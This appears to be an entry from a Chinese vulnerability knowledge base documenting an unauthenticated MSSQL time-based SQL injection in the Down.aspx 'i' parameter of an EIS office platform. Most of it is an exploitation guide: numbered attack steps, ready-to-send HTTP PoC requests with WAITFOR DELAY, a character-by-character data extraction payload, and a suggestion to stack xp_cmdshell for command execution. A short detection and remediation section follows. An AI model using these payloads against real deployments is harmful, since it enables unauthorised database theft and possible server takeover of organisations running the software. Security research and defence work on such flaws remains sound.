---
id: web-generic-sqli-eis-down-aspx-i-param-mssql
title: EIS 办公平台 Down.aspx i 参数直拼 main_id：前台 MSSQL 延时注入
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-aspx-string-concat-mssql-time-blind
aliases:
- EIS SQL 注入
- Down.aspx 注入
- 办公平台下载接口注入
- main_id 拼接注入
- WAITFOR DELAY 延时注入
- OA_DOC_FILE_INFO 注入
tags:
- sqli
- dotnet
- aspx
- mssql
- time-based
- oa
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:10:55+08:00'
  notes: 已对照原文与图13/14核对：GetByte() 中 string arg = base.Request["i"]，随后 DataAccess.GetDataRow($"SELECT filedata,filepath,recordid,filetype FROM OA_DOC_FILE_INFO WHERE [type]=101 AND main_id='{arg}'")，字符串插值上下文与卡内一致；图14 GET Down.aspx?i=1'+WAITFOR+DELAY+'0:00:05'-- 返回 200、耗时 5,628ms、页面提示“下载失败，文件不存在！”，延时注入已打通；请求无认证 Cookie，前台可达成立。原文只验证 WAITFOR 延时，未取数/未 xp_cmdshell，卡内已标注边界；PoC 未本机执行。原文未给产品版本，未设置 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

某 EIS 办公平台的下载接口 `Down.aspx` 把请求参数 `i` 直接拼进 `SELECT filedata,filepath,recordid,filetype FROM OA_DOC_FILE_INFO WHERE [type]=101 AND main_id='{arg}'`，未参数化、未校验，未登录即可用 MSSQL `WAITFOR DELAY` 延时注入确认并进一步盲注取数。

## 原理

- 入口：`Down.aspx` 的 `GetByte()` 方法（页面下载逻辑），`string arg = base.Request["i"];`。
- 拼接：`DataAccess.GetDataRow($"SELECT filedata,filepath,recordid,filetype FROM OA_DOC_FILE_INFO WHERE [type]=101 AND main_id='{arg}'")`，`arg` 处于单引号字符串上下文，直接被插值进 SQL。
- 缺陷：没有 `int.Parse`/参数化查询/白名单，单引号可闭合 `main_id='...'` 并追加任意 MSSQL 语句；`DataAccess.GetDataRow` 以文本方式执行，数据库为 MSSQL。
- 为什么前台可达：该下载页面未要求登录，请求可直接携带 `i` 参数到达查询；文章截图请求未带任何认证 Cookie。
- 延时原语：`i=1'+WAITFOR+DELAY+'0:00:05'--` 闭合字符串并注释掉尾部，若响应稳定延迟约 5 秒，即证明注入进入 SQL 语法层且当前账号有执行权限；后续可替换为子查询做布尔/时间盲注，或在权限足够时尝试堆叠 `EXEC xp_cmdshell`。

## 触发条件

- 目标 EIS 办公平台存在 `Down.aspx` 且可匿名访问。
- `i` 参数进入上述 SQL 且数据库为 MSSQL。
- 数据库连接账号有执行 `WAITFOR` 的权限（普通查询权限即可）。
- 时间盲注要求网络延迟稳定，最好多次测量取基线。

## 利用步骤

1. 先请求 `Down.aspx?i=1` 记录正常响应时间作为基线。
2. 请求 `Down.aspx?i=1'+WAITFOR+DELAY+'0:00:05'--`，观察响应是否稳定增加约 5 秒。
3. 确认后把延时替换为条件表达式，例如 `i=1';IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:00:05'--`，逐位提取库名、表名、列名与数据。
4. 若当前账号权限足够，可尝试堆叠执行 `EXEC xp_cmdshell` 或写文件；文章仅验证到延时注入。
5. 注意 URL 编码：`+` 表示空格，`--` 后需跟空格或注释边界。

## PoC

```http
GET /Down.aspx?i=1'+WAITFOR+DELAY+'0:00:05'-- HTTP/1.1
Host: target.example:8001
User-Agent: Mozilla/5.0
Connection: close
```

```text
# 预期：响应时间约 5 秒（文章实测 5.628 秒），页面返回“下载失败，文件不存在！”
# 基线请求 i=1 为毫秒级，可排除网络抖动。
```

布尔/时间盲注变体：

```http
GET /Down.aspx?i=1';IF(ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>77)+WAITFOR+DELAY+'0:00:03'-- HTTP/1.1
```

## 变体与关联

- 变体：同一系统中其他把 `Request["..."]` 插值进 `main_id='...'` 的下载/详情接口通常同样存在注入，可批量搜索 `$"SELECT ... WHERE ...='{` 模式。
- 变体：若页面回显查询结果或错误，可转为报错注入/联合查询，效率高于时间盲注。
- 关联：[[web-generic-sqli-dotnet-handler-mssql-param-concat-version]]（.NET Handler 参数直拼 MSSQL 的同类模式）；[[web-generic-sqli-dotnet-oracle-error-dbms-xdb-checkin]]（.NET 拼接注入的报错利用）。
- 边界：文章只做了 `WAITFOR DELAY` 验证，未演示取数或命令执行；若数据库账号被降权、`WAITFOR` 被禁用，则只能确认注入存在。

## 检测与防御

- 检测：审计所有 `DataAccess.GetDataRow`/`ExecSql` 的字符串插值调用；WAF/日志中关注 `WAITFOR`、`SLEEP`、`IF(`、单引号闭合等特征；监控 `Down.aspx` 的异常长耗时请求。
- 修复：`i` 强制转 `int`/GUID 后使用参数化查询（`@main_id`），禁止字符串拼接；数据库账号最小权限，禁用 `xp_cmdshell`。
- 加固：下载接口增加登录与对象级权限校验，避免仅凭 `main_id` 下载任意文件；统一数据访问层强制参数化。
